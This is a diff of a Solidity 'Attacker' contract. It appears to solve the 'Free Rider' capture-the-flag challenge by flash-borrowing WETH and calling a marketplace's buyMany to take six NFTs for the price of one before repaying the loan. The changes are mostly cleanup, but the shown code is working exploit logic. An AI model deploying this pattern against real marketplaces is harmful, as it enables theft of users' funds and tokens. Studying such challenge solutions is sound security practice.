@@ -35,7 +35,6 @@ contract Attacker is IERC721Receiver, ReentrancyGuard {
 
     IERC721 private immutable _nft;
     uint256 private _received;
-    uint256[] tokenIds;
 
     constructor(
         address attacker_,
@@ -85,21 +84,20 @@ contract Attacker is IERC721Receiver, ReentrancyGuard {
 
         // Your custom code would go here. For example, code to arbitrage.
         require(tokenBorrow == address(weth), "token borrow != WETH");
-        uint256 counter = 0;
 
         uint256[] memory tokenIds = new uint256[](6);
         for (uint256 tokenId = 0; tokenId < 6; tokenId++) {
             tokenIds[tokenId] = tokenId;
         }
-        
+
         weth.withdraw(15e18);
         freeRiderNFTMarketplace.buyMany{value: 15 ether}(tokenIds);
 
         for (uint256 tokenId = 0; tokenId < 6; tokenId++) {
-             _nft.safeTransferFrom(address(this), _buyer, tokenId);
+            _nft.safeTransferFrom(address(this), _buyer, tokenId);
         }
-       
-       // freeRiderNFTMarketplace.buyMany{value: 15 ether}(tokenIds);
+
+        // freeRiderNFTMarketplace.buyMany{value: 15 ether}(tokenIds);
         // about 0.3% fee, +1 to round up
         uint fee = (amount1 * 3) / 997 + 1;
         uint256 amountToRepay = amount1 + fee;
@@ -119,12 +117,8 @@ contract Attacker is IERC721Receiver, ReentrancyGuard {
         uint256 tokenId,
         bytes calldata data
     ) external returns (bytes4) {
-        //_nft.transferFrom(address(this), address(_buyer), tokenId);
-        
         return IERC721Receiver.onERC721Received.selector;
     }
 
-    receive() external payable {
-      // weth.deposit{value: address(this).balance}();
-    }
+    receive() external payable {}
 }
